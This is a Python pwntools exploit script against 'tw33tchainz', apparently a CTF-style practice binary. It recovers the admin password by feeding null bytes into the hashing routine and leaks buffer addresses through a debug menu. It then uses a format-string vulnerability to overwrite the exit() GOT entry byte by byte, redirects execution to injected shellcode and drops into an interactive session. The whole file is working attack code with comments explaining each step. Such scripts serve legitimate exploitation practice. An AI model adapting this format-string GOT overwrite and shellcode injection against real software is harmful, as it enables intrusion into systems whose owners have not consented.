#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template tw33tchainz
from pwn import *
from re import search

# Set up pwntools for the correct architecture
exe = context.binary = ELF('tw33tchainz')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.print_exit:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

context.terminal = ["xfce4-terminal", "-e"]
libc =  ELF("/usr/lib32/libc.so.6")
rop  =  ROP(libc)
io = start()
CHOICE_MSG = "Enter Choice: "

def crack_password():
    """
    hashing pseudo-code:
        for (int i = 0; i < 16; i++) {
            ecx = salt[i] & 0xff;
            ecx = ecx + secretpass[i] & 0xff;
            eax = username[i] & 0xff;
            eax = eax ^ ecx;

            hash[i] = eax;
        }

    The user input is collected using fgets, so it won't stop at \x00 bytes
    Then, by supplying 2 buffers full of \x00 bytes, the returned hash will
    be the actual secretpass
    """

    username = "\x00" * 0x0f
    salt     = "\x00" * 0x0f

    io.recvuntil("Enter Username: \n")
    io.send(username)
    io.recvuntil("Enter Salt: \n")
    io.sendline(salt)
    io.recvuntil("Generated Password:\n")
    password = io.recvline().lstrip().rstrip()

    log.info("Got password: " + password)

    secret = ''
    # decode the little-endian encoding
    for elem in [password[i:i+8] for i in range(0, len(password), 8)]:
        secret += p32(int(elem, 16))
    log.info("Recovered: " + secret)

    return secret


def do_tweet(msg):
    io.recvuntil(CHOICE_MSG)
    io.sendline("1")
    io.recvuntil("Enter tweet data (16 bytes): ")
    if len(msg) > 16: log.error("You are tweeting something too big")
    if len(msg) < 16: msg += "\n"
    io.send(msg)

    if "\n" in msg:
        io.recvuntil("Please do not try to lop off our birdies heads :(\n")
        io.sendline()
    else:
        io.sendline()
    log.info("Tweeted: " + msg)

def get_admin(password):
    io.recvuntil(CHOICE_MSG)
    io.sendline("3")
    io.recvuntil("Enter password: ")
    io.sendline(password)
    recv = io.recvline()
    log.info(recv)

    if "Nope" in recv:
        return False
    return True

def enable_debug_mode():
    io.recvuntil(CHOICE_MSG)
    io.sendline("6")
    log.info("Enabled debug mode in app")
    io.sendline()

def get_chain_addresses():
    io.recvuntil(CHOICE_MSG)
    io.sendline("2")
    data = io.recv()

    match = search(r"Address: 0x([0-9a-f]+)", data)
    log.info("Leaked: " + str(match.groups()))
    io.sendline()

    return list(match.groups())

def write_byte(addr, value):
    craft = "A{}%{}x%8$hnn".format(p32(addr), value - 5)
    log.info("Sending {} with len {}".format(craft, len(craft)))
    do_tweet(craft)
    log.info("Written {} at {}".format(hex(value), hex(addr)))

# --- debug purpose functions ---
def leak_argN(n):
    craft = "AAAAA%{}$x".format(n)
    do_tweet(craft)
    io.recvuntil("AAAAA")

    return io.recvline().rstrip()[:-9]

def dump_stack(args):
    data = []
    for arg in args:
        data.append(leak_argN(arg))

    for (i, dump) in enumerate(data):
        print ("{} | {} ({})".format(i + 1, dump, p32(int(dump, 16))))
# ---

secret = crack_password()
if not get_admin(secret):
    log.error("Failed to get admin. Run again, sometimes it fails")
    exit(-1)

# There is a format string vulnerability in status message (only in admin mode). It allows us to write 16 bytes of data.
# That is enough to write 2 bytes a time. We could rewrite GOT entry for exit() and redirect execution to one of buffers
# controlled by us.

# First, let's enable debug mode in the app, this will allow leaking of tweets addresses
enable_debug_mode()

# Now, we should write our shellcode into the memory, it need to be smaller than 16 bytes
do_tweet("\xcc" * 16)

# Obtain shellcode address
addresses = get_chain_addresses()
shellcode_addr = int(addresses[0], 16)

# Rewrite the GOT
exit_GOT = exe.got['exit']
log.info("exit@GOT: " + hex(exit_GOT))
for i in range(0, 4):
    to_write = (shellcode_addr >> (8 * i)) & 0xff
    log.info("Byte to write: " + hex(to_write))
    write_byte(exit_GOT + i, to_write)

# Call shellcode
io.recvuntil(CHOICE_MSG)
io.sendline("5")

io.interactive()

